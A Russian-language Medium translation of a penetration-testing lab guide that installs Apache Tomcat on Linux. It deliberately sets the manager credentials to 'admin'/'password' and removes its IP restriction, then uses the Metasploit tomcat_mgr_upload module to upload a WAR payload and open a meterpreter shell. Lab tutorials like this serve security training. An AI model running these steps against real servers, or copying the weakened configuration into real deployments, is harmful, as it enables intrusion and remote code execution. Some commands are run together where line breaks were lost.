<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Пентестинг с помощью Apache Tomcat на Linux</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Пентестинг с помощью Apache Tomcat на Linux</h1>
</header>
<section data-field="subtitle" class="p-summary">
В этой статье подробно рассказывается о процессе установки Apache Tomcat на любой компьютер с ОС Linux, а также затронут вопрос о…
</section>
<section data-field="body" class="e-content">
<section name="a48b" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="badb" id="badb" class="graf graf--h3 graf--leading graf--title">Пентестинг с помощью Apache Tomcat на Linux</h3><figure name="e8a4" id="e8a4" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="1*vH7CE1pw5dNDacsikdGlIA.png" data-width="3500" data-height="3000" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*vH7CE1pw5dNDacsikdGlIA.png"></figure><p name="d232" id="d232" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">В этой статье подробно рассказывается о процессе установки Apache Tomcat на любой компьютер с ОС Linux, а также затронут вопрос о получении контроля над компьютером жертвы с помощью данного сервера</strong>.</p><h3 name="0d6d" id="0d6d" class="graf graf--h3 graf-after--p">Знакомство с Apache Tomcat</h3><p name="9567" id="9567" class="graf graf--p graf-after--h3">Apache Tomcat, который также известен как Tomcat Server, является веб-сервером HTTP на базе Java. Он реализует спецификации Java EE, такие как Java Servlet, JavaServer Pages (JSP), Java EL и WebSocket. Это программное обеспечение с открытым исходным кодом, созданное разработчиками Apache Software Foundation. Apache был выпущен еще в 1999 году. На данный момент Apache Tomcat имеет уже 20-летнюю историю.</p><p name="c0ce" id="c0ce" class="graf graf--p graf-after--p">Apache Tomcat в своей простейшей конфигурации работает в качестве определенного процесса, осуществляемого в операционной системе. Этот процесс еще известен как виртуальная машина Java (JVM). Он позволяет Apache Tomcat функционировать независимо от платформы, а также быть безопасным для системы по сравнению с другими его аналогами.</p><h3 name="a725" id="a725" class="graf graf--h3 graf-after--p">Настройка Apache Tomcat</h3><p name="df38" id="df38" class="graf graf--p graf-after--h3">Пользователь начинает с установки Apache Tomcat, но перед этим он должен выполнить следующие команды.</p><pre name="2268" id="2268" class="graf graf--pre graf-after--p">apt update<br>apt install apache2</pre><p name="29ae" id="29ae" class="graf graf--p graf-after--pre">Теперь, Apache Tomcat нужен Java, установленный таким образом, что код приложения Java может быть выполнен на сервере. Для того чтобы реализовать это, требуется наличие Java Development Kit.</p><pre name="2f82" id="2f82" class="graf graf--pre graf-after--p">apt-get install default-jdk</pre><figure name="0410" id="0410" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*E3AlCvTWN4KfeFch.png" data-width="697" data-height="290" src="https://cdn-images-1.medium.com/max/800/0*E3AlCvTWN4KfeFch.png"></figure><h4 name="1e97" id="1e97" class="graf graf--h4 graf-after--figure">Регистрация пользователя Tomcat и формирование группы</h4><p name="65df" id="65df" class="graf graf--p graf-after--h4">Для того чтобы запустить tomcat от имени непривилегированного пользователя, нужно создать новую группу и пользователя с именем Tomcat. Такой пользователь создается в /opt, поэтому следует установить Tomcat именно в этот каталог. Не требуется, чтобы пользователь Tomcat использовал шелл, будут применены следующие параметры для установки /bin / false shell. При этом аутентификация пользователя Tomcat отключена.</p><pre name="4706" id="4706" class="graf graf--pre graf-after--p">groupadd tomcat<br>cd opt<br>mkdir tomcat<br>useradd -s /bin/false -g tomcat -d /opt/tomcat tomcat</pre><figure name="757c" id="757c" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*3WCS4AvWHTILt7k5.png" data-width="686" data-height="41" src="https://cdn-images-1.medium.com/max/800/0*3WCS4AvWHTILt7k5.png"></figure><h4 name="5a19" id="5a19" class="graf graf--h4 graf-after--figure">Скачивание Tomcat Manager</h4><p name="58a0" id="58a0" class="graf graf--p graf-after--h4">Скачать пакет Apache Tomcat можно <a href="https://tomcat.apache.org/download-90.cgi" data-href="https://tomcat.apache.org/download-90.cgi" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">здесь</a>. После загрузки нужно распаковать пакет в /opt и продолжить установку.</p><pre name="d304" id="d304" class="graf graf--pre graf-after--p">sudo tar xzvf apache-tomcat-9.0.24.tar.gz -C /opt/tomcat --strip-components=1</pre><figure name="61fe" id="61fe" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*ftPalZ2pXAqP8cbN.png" data-width="858" data-height="260" src="https://cdn-images-1.medium.com/max/800/0*ftPalZ2pXAqP8cbN.png"></figure><h4 name="beae" id="beae" class="graf graf--h4 graf-after--figure">Получение разрешения</h4><p name="1cb5" id="1cb5" class="graf graf--p graf-after--h4">Теперь пользователь вводит команду chgrp, чтобы передать право собственности на каталог Tomcat группе Tomcat.</p><pre name="5ed8" id="5ed8" class="graf graf--pre graf-after--p">cd /opt/tomcatchgrp -R tomcat /opt/tomcat</pre><p name="8a73" id="8a73" class="graf graf--p graf-after--pre">Это делается для того, чтобы разрешить пользователю Tomcat group выполнять операции. Необходимо изменить разрешение для файла /conf, как указано ниже.</p><pre name="697d" id="697d" class="graf graf--pre graf-after--p">chmod -R g+r confchmod g+x conf</pre><p name="452f" id="452f" class="graf graf--p graf-after--pre">Также будут предоставлены права собственности пользователям Тomcat group для каталогов, таких как webapp/, work/, temp/ и logs/.</p><pre name="a83f" id="a83f" class="graf graf--pre graf-after--p">chown -R tomcat webapps/ work/ temp/ logs/</pre><p name="e747" id="e747" class="graf graf--p graf-after--pre">Следует добиться того, чтобы Apache Tomcat запускался как служба, и для этого придется создать системную службу. Пользователю потребуется расположение установки Java. Для этого выполняется команда, приведенная ниже.</p><pre name="641a" id="641a" class="graf graf--pre graf-after--p">update-java-alternatives -l</pre><figure name="415f" id="415f" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*gNhOGKrff87n6ncH.png" data-width="728" data-height="125" src="https://cdn-images-1.medium.com/max/800/0*gNhOGKrff87n6ncH.png"></figure><h4 name="741b" id="741b" class="graf graf--h4 graf-after--figure">Создание файла службы systemd</h4><p name="0f6d" id="0f6d" class="graf graf--p graf-after--h4">Для того чтобы создать этот файл, следует открыть служебный файл tomcat. в каталоге /etc/systemd/system с помощью редактора nano.</p><pre name="c84f" id="c84f" class="graf graf--pre graf-after--p">nano /etc/systemd/system/tomcat.service</pre><p name="80f2" id="80f2" class="graf graf--p graf-after--pre">Далее пользователь выполняет следующие команды и изменяет JAVA_HOME, как показано на картинке ниже. После его сохранения Tomcat станет выполнять роль системной службы.</p><pre name="f1d3" id="f1d3" class="graf graf--pre graf-after--p">[Unit]<br>Description=Apache Tomcat Web Application Container<br>After=network.target<br> <br>[Service]<br>Type=forking<br> <br>Environment=JAVA_HOME=/usr/lib/jvm/java-1.11.0-openjdk-amd64<br>Environment=CATALINA_PID=/opt/tomcat/temp/tomcat.pid<br>Environment=CATALINA_HOME=/opt/tomcat<br>Environment=CATALINA_BASE=/opt/tomcat<br>Environment=&#39;CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC&#39;<br>Environment=&#39;JAVA_OPTS=-Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom&#39;<br> <br>ExecStart=/opt/tomcat/bin/startup.sh<br>ExecStop=/opt/tomcat/bin/shutdown.sh<br> <br>User=tomcat<br>Group=tomcat<br>UMask=0007<br>RestartSec=10<br>Restart=always<br> <br>[Install]<br>WantedBy=multi-user.target</pre><figure name="cf01" id="cf01" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*Yg_7Z3f-yB-oBlpU.png" data-width="795" data-height="476" src="https://cdn-images-1.medium.com/max/800/0*Yg_7Z3f-yB-oBlpU.png"></figure><p name="54dc" id="54dc" class="graf graf--p graf-after--figure">Нужно перезапустить systemd daemon, чтобы зарегистрировать только что созданный сервис Tomcat. Если все сделано правильно, пользователь сможет увидеть Apache Tomcat как системную службу.</p><pre name="eead" id="eead" class="graf graf--pre graf-after--p">sudo systemctl daemon-reload<br>sudo systemctl start tomcat<br>sudo systemctl status tomcat</pre><figure name="3b59" id="3b59" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*YgxBrfY98LQIAxR5.png" data-width="725" data-height="191" src="https://cdn-images-1.medium.com/max/800/0*YgxBrfY98LQIAxR5.png"></figure><h4 name="cbbb" id="cbbb" class="graf graf--h4 graf-after--figure">Обновление брандмауэра для разрешения работы Тomcat</h4><p name="bd2a" id="bd2a" class="graf graf--p graf-after--h4">Пришло время разрешить Тomcat работать через брандмауэр, так как Ubuntu имеет установленный и настроенный по умолчанию ufw. Apache Tomcat обычно использует порт 8080 для получения запросов пользователей.</p><pre name="59b4" id="59b4" class="graf graf--pre graf-after--p">sudo ufw allow 8080</pre><figure name="4c73" id="4c73" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*Pjyghvh8rJ4jIHl5.png" data-width="435" data-height="60" src="https://cdn-images-1.medium.com/max/800/0*Pjyghvh8rJ4jIHl5.png"></figure><p name="3504" id="3504" class="graf graf--p graf-after--figure">Пользователю следует выполнить приведенную ниже команду для того, чтобы Тomcat запускался автоматически каждый раз при загрузке компьютера.</p><pre name="333b" id="333b" class="graf graf--pre graf-after--p">sudo systemctl enable tomcat</pre><figure name="00aa" id="00aa" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*lYkBnyQUInTMjdKZ.png" data-width="591" data-height="43" src="https://cdn-images-1.medium.com/max/800/0*lYkBnyQUInTMjdKZ.png"></figure><h4 name="da03" id="da03" class="graf graf--h4 graf-after--figure">Настройка интерфейса Tomcat</h4><p name="3bcf" id="3bcf" class="graf graf--p graf-after--h4">На этом этапе, при просмотре IP-адреса сервера с портом 8080, пользователя встретит страница Apache Tomcat. Но если он нажмет по ссылке на приложение Manager, ему будет отказано в доступе. Это означает, что пользователь еще не настроил интерфейс Tomcat Web Manager. Итак, нужно сделать это и завершить настройку Apache Tomcat.</p><p name="58d6" id="58d6" class="graf graf--p graf-after--p">Следует открыть файл с помощью редактора nano и внести следующие изменения, как показано на рисунке ниже.</p><pre name="b0cc" id="b0cc" class="graf graf--pre graf-after--p">sudo nano /opt/tomcat/conf/tomcat-users.xml<br>&lt;user username=&quot;admin&quot; password=&quot;password&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;</pre><p name="a957" id="a957" class="graf graf--p graf-after--pre">Пользователь может изменить имя и пароль в соответствии с его предпочтениями. Все данные сохраняются и после внесения соответствующих изменений редактор нужно закрыть.</p><figure name="d6b8" id="d6b8" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*YTzg6XM5lHy2YcKZ.png" data-width="715" data-height="175" src="https://cdn-images-1.medium.com/max/800/0*YTzg6XM5lHy2YcKZ.png"></figure><p name="a7c8" id="a7c8" class="graf graf--p graf-after--figure">По умолчанию Apache Tomcat ограничивает доступ к подключению к приложениям Manager и Host Manager. Поскольку Tomcat устанавливается для получения доступа удаленно, вероятно, стоит изменить эту ситуацию. Для того чтобы отменить данные ограничения, пользователю необходимо отредактировать файлы <strong class="markup--strong markup--p-strong">context.xml</strong>.</p><pre name="8681" id="8681" class="graf graf--pre graf-after--p">sudo nano /opt/tomcat/webapps/manager/META-INF/context.xml</pre><p name="c005" id="c005" class="graf graf--p graf-after--pre">Надо закомментировать ограничение IP-адреса, чтобы разрешить подключение из любого места. Кроме того, это еще делается для того, если пользователь хочет оставить доступ только к соединениям, идущим с его собственного IP-адреса.</p><figure name="2172" id="2172" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*-u9VRGv7IkzLVMZ6.png" data-width="697" data-height="423" src="https://cdn-images-1.medium.com/max/800/0*-u9VRGv7IkzLVMZ6.png"></figure><pre name="0b0b" id="0b0b" class="graf graf--pre graf-after--figure">sudo nano /opt/tomcat/webapps/host-manager/META-INF/context.xml</pre><p name="a57f" id="a57f" class="graf graf--p graf-after--pre">То же самое делается с файлом host-manager для того, чтобы разрешить доступ к менеджеру хоста.</p><figure name="502d" id="502d" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*VkQmdd7c-wtHzdvV.png" data-width="677" data-height="424" src="https://cdn-images-1.medium.com/max/800/0*VkQmdd7c-wtHzdvV.png"></figure><p name="86b9" id="86b9" class="graf graf--p graf-after--figure">Изменения сохраняются и служба Tomcat перезапускается.</p><pre name="1f6e" id="1f6e" class="graf graf--pre graf-after--p">systemctl restart tomcat</pre><figure name="0afa" id="0afa" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="0*1q0yPxex5l0ikyi-.png" data-width="481" data-height="28" src="https://cdn-images-1.medium.com/max/800/0*1q0yPxex5l0ikyi-.png"></figure><h4 name="e40e" id="e40e" class="graf graf--h4 graf-after--figure">Получение доступа к интерфейсу</h4><p name="b67e" id="b67e" class="graf graf--p graf-after--h4">Пользователь попадает в интерфейс, введя доменное имя своего сервера или IP-адрес, а затем открывает порт 8080 в браузере. Теперь он может проверить, работают ли интерфейсы Manager и Host Manager. Нужно нажать на кнопки, выделенные красным на изображении.</p><figure name="8cda" id="8cda" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*Pa4xCTbd94STr9FW.png" data-width="1014" data-height="359" src="https://cdn-images-1.medium.com/max/800/0*Pa4xCTbd94STr9FW.png"></figure><p name="ef50" id="ef50" class="graf graf--p graf-after--figure">Появляется страница аутентификации входа в систему, как и ожидалось. Пользователь вводит учетные данные, которые были придуманы ранее.</p><figure name="acbc" id="acbc" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*K13wLBL2z0aYyK6I.png" data-width="771" data-height="210" src="https://cdn-images-1.medium.com/max/800/0*K13wLBL2z0aYyK6I.png"></figure><p name="2785" id="2785" class="graf graf--p graf-after--figure">После проверки учетных данных Apache Tomcat отправляет пользователя в интерфейс диспетчера виртуальных хостов Tomcat. На этой странице человек может добавить виртуальные хосты для обслуживания своих приложений. На этом настройка Apache Tomcat завершается.</p><figure name="a3b2" id="a3b2" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*nB6yxjZZfM8fFyVz.png" data-width="1021" data-height="507" src="https://cdn-images-1.medium.com/max/800/0*nB6yxjZZfM8fFyVz.png"></figure><h3 name="5251" id="5251" class="graf graf--h3 graf-after--figure">Применение Apache Tomcat</h3><p name="d51d" id="d51d" class="graf graf--p graf-after--h3">Теперь, когда фреймворк Apache Tomcat был успешно установлен, нужно провести пентестинг. Используется Metasploit.</p><p name="a449" id="a449" class="graf graf--p graf-after--p">Этот модуль может быть применен для выполнения полезной нагрузки на серверах Apache Tomcat. Полезная нагрузка загружается в виде архива WAR, содержащего приложение JSP, использующее POST-запрос для компонентов /manager/html /upload.</p><p name="12c6" id="12c6" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Примечание</strong>: совместимые наборы полезной нагрузки варьируются в зависимости от выбранной цели. Например, необходимо выбрать целевой объект Windows для использования собственных полезных нагрузок Windows.</p><pre name="c223" id="c223" class="graf graf--pre graf-after--p">use exploit/multi/http/tomcat_mgr_upload<br>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set target 2<br>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set rhosts 192.168.0.23<br>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080<br>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set httpUsername admin<br>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword password<br>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; exploit</pre><p name="acde" id="acde" class="graf graf--p graf-after--pre">В результате пользователь получает доступ к сеансу meterpreter целевого компьютера.</p><pre name="7518" id="7518" class="graf graf--pre graf-after--p">meterpreter &gt; shell<br>id</pre><p name="8d74" id="8d74" class="graf graf--p graf-after--pre">О других способах использования Tomcat manager можно почитать, перейдя по <a href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/" data-href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">ссылке</a>.</p><figure name="5a6c" id="5a6c" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*bCjAnpISNbSDJ1l2.png" data-width="692" data-height="467" src="https://cdn-images-1.medium.com/max/800/0*bCjAnpISNbSDJ1l2.png"></figure><p name="6f51" id="6f51" class="graf graf--p graf-after--figure">Автор <a href="https://www.hackingarticles.in/apache-tomcat-penetration-testing-lab-setup/" data-href="https://www.hackingarticles.in/apache-tomcat-penetration-testing-lab-setup/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">переведенной статьи</a>: Ahmad, пентестер и исследователь в сфере информационной безопасности.</p><p name="bccc" id="bccc" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Важно!</strong> Информация исключительно в учебных целях. Пожалуйста, соблюдайте законодательство и не применяйте данную информацию в незаконных целях.</p><p name="fa80" id="fa80" class="graf graf--p graf-after--p"><a href="http://cisoclub.ru" data-href="http://cisoclub.ru" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Источник</a></p><ul class="postList"><li name="b285" id="b285" class="graf graf--li graf-after--p">⚫️ Статьи и новости — <a href="https://t.me/gebutcher" data-href="https://t.me/gebutcher" class="markup--anchor markup--li-anchor" rel="noopener" target="_blank">@Gebutcher</a></li></ul><figure name="ccd2" id="ccd2" class="graf graf--figure graf-after--li graf--trailing"><img class="graf-image" data-image-id="0*eW4bkQYOe4tO9F2D.png" data-width="1280" data-height="200" src="https://cdn-images-1.medium.com/max/800/0*eW4bkQYOe4tO9F2D.png"></figure></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@gebutcher" class="p-author h-card">Gebutcher</a> on <a href="https://medium.com/p/2b67d6deefb1"><time class="dt-published" datetime="2021-02-03T20:27:32.074Z">February 3, 2021</time></a>.</p><p><a href="https://medium.com/@gebutcher/%D0%BF%D0%B5%D0%BD%D1%82%D0%B5%D1%81%D1%82%D0%B8%D0%BD%D0%B3-%D1%81-%D0%BF%D0%BE%D0%BC%D0%BE%D1%89%D1%8C%D1%8E-apache-tomcat-%D0%BD%D0%B0-linux-2b67d6deefb1" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on October 10, 2023.</p></footer></article></body></html>